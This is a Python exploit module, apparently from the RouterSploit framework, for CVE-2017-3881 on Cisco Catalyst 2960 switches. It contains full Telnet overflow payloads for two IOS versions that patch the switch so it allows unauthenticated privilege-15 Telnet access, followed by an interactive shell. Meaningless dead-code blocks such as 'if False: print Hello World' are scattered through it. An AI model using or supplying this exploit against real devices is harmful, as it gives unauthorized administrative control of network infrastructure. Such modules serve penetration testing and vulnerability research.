from routersploit.core.exploit import *
from routersploit.core.tcp.tcp_client import TCPClient
from routersploit.core.telnet.telnet_client import TelnetClient

class Exploit(TCPClient, TelnetClient):
    __info__ = {'name': 'Cisco Catalyst 2960 ROCEM RCE', 'description': 'Module exploits Cisco Catalyst 2960 ROCEM RCE vulnerability. If target is vulnerable, it is possible to patch execution flow to allow credless telnet interaction with highest privilege level.', 'authors': ('Artem Kondratenko <@artkond>', 'Marcin Bury <marcin[at]threat9.com>'), 'references': ('https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-3881', 'https://artkond.com/2017/04/10/cisco-catalyst-remote-code-execution/', 'https://www.exploit-db.com/exploits/41872/', 'https://www.exploit-db.com/exploits/41874/'), 'devices': ('Cisco Catalyst 2960 IOS 12.2(55)SE1', 'Cisco Catalyst 2960 IOS 12.2(55)SE11')}
    target = OptIP('', 'Target IPv4 or IPv6 address')
    port = OptPort(23, 'Target Telnet port')
    action = OptString('set', 'set / unset credless authentication for Telnet service')
    device = OptInteger(-1, "Target device - use 'show devices'")

    def __init__(self):
        if False:
            print('Hello World!')
        self.payloads = [{'template': b'\xff\xfa$\x00' + b'\x03CISCO_KITS\x012:' + b'A' * 116 + b'\x00\x007\xb4' + b'\x02,\x8bt' + b'{FUNC_IS_CLUSTER_MODE}' + b'BBBB' + b'\x00\xdf\xfb\xe8' + b'CCCC' + b'DDDD' + b'EEEE' + b'\x00\x06x\x8c' + b'\x02,\x8b`' + b'FFFF' + b'GGGG' + b'\x00k\xa1(' + b'{FUNC_PRIVILEGE_LEVEL}' + b'HHHH' + b'IIII' + b'\x01H\xe5`' + b'JJJJ' + b'KKKK' + b'LLLL' + b'\x01\x131\xa8' + b':15:' + b'\xff\xf0', 'func_is_cluster_mode': {'set': b'\x00\x00\x99\x80', 'unset': b'\x00\x04\xeaX'}, 'func_privilege_level': {'set': b'\x00\x12R\x1c', 'unset': b'\x00\x04\xe6\xf0'}}, {'template': b'\xff\xfa$\x00' + b'\x03CISCO_KITS\x012:' + b'A' * 116 + b'\x00\x007\xb4' + b'\x02=U\xdc' + b'{FUNC_IS_CLUSTER_MODE}' + b'BBBB' + b'\x00\xe1\xa9\xf4' + b'CCCC' + b'DDDD' + b'EEEE' + b'\x00\x06{\\' + b'\x02=U\xc8' + b'FFFF' + b'GGGG' + b'\x00l\xb3\xa0' + b'{FUNC_PRIVILEGE_LEVEL}' + b'HHHH' + b'IIII' + b'\x01J\xcf\x98' + b'JJJJ' + b'KKKK' + b'LLLL' + b'\x01\x14\xe7\xec' + b':15:' + b'\xff\xf0', 'func_is_cluster_mode': {'set': b'\x00\x00\x99\x9c', 'unset': b'\x00\x04\xea\xe0'}, 'func_privilege_level': {'set': b"\x00'\x0b\x94", 'unset': b'\x00\x04\xe7x'}}]

    def run(self):
        if False:
            i = 10
            return i + 15
        if int(self.device) < 0 or int(self.device) >= len(self.payloads):
            print_error('Set target device - use "show devices" and "set device <id>"')
            return
        if self.action not in ['set', 'unset']:
            print_error('Specify action: set / unset credless authentication for Telnet service')
            return
        print_status('Trying to connect to Telnet service on port {}'.format(self.port))
        tcp_client = self.tcp_create()
        if tcp_client.connect():
            response = tcp_client.recv(1024)
            print_status('Connection OK')
            print_status('Received bytes from telnet service: {}'.format(repr(response)))
        else:
            print_error('Connection failed')
            return
        print_status('Building payload...')
        payload = self.build_payload()
        if self.action == 'set':
            print_status('Setting credless privilege 15 authentication')
        else:
            print_status('Unsetting credless privilege 15 authentication')
        print_status('Sending cluster option')
        tcp_client.send(payload)
        tcp_client.close()
        print_status('Payload sent')
        if self.action == 'set':
            print_status('Connecting to Telnet service...')
            telnet_client = self.telnet_create()
            if telnet_client.connect():
                telnet_client.interactive()
            else:
                print_error('Exploit failed')
        else:
            print_status('Check if Telnet authentication was set back')

    def build_payload(self):
        if False:
            print('Hello World!')
        payload = self.payloads[self.device]['template']
        payload = payload.replace(b'{FUNC_IS_CLUSTER_MODE}', self.payloads[self.device]['func_is_cluster_mode'][self.action])
        payload = payload.replace(b'{FUNC_PRIVILEGE_LEVEL}', self.payloads[self.device]['func_privilege_level'][self.action])
        return payload

    @mute
    def check(self):
        if False:
            for i in range(10):
                print('nop')
        return None